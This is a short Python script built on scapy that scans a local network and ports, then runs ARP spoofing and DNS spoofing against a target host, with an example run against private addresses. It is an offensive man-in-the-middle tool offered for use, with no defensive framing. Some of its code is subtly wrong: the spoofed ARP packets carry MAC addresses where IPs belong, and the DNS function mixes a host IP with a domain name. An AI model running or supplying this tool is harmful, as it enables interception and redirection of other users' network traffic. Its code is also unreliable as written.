#!/usr/bin/env python3

from scapy.all import *

def scan_network():
    """
    Scans the local network and returns a list of active hosts.
    """
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24")
    response = srp(arp_request, timeout=1, verbose=False)[0]
    hosts = []
    for packet in response:
        host = {'ip': packet[1].psrc, 'mac': packet[1].hwsrc}
        hosts.append(host)
    return hosts

def port_scan(host, start_port, end_port):
    """
    Scans a host for open ports in the specified range.
    """
    open_ports = []
    for port in range(start_port, end_port+1):
        result = sr1(IP(dst=host)/TCP(dport=port, flags="S"), timeout=1, verbose=False)
        if result and result.haslayer(TCP) and result[TCP].flags == "SA":
            open_ports.append(port)
    return open_ports

def arp_spoof(target, gateway):
    """
    Spoofs ARP packets to make the target machine send all traffic through us.
    """
    target_mac = getmacbyip(target)
    gateway_mac = getmacbyip(gateway)
    send(ARP(op=2, pdst=target, psrc=gateway_mac, hwdst=target_mac))
    send(ARP(op=2, pdst=gateway, psrc=target_mac, hwdst=gateway_mac))

def dns_spoof(target, ip):
    """
    Spoofs DNS responses to redirect traffic from the target machine to a specified IP.
    """
    def callback(pkt):
        if pkt.haslayer(DNSQR):
            if target in pkt[DNS].qd.qname.decode():
                response = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                           UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                           DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                               an=DNSRR(rrname=pkt[DNS].qd.qname, rdata=ip))
                send(response, verbose=0)
    sniff(filter="udp port 53 and host "+target, prn=callback)

if __name__ == "__main__":
    # Example usage:
    print(scan_network())
    print(port_scan("192.168.1.1", 1, 1000))
    arp_spoof("192.168.1.2", "192.168.1.1")
    dns_spoof("192.168.1.2", "192.168.1.3")
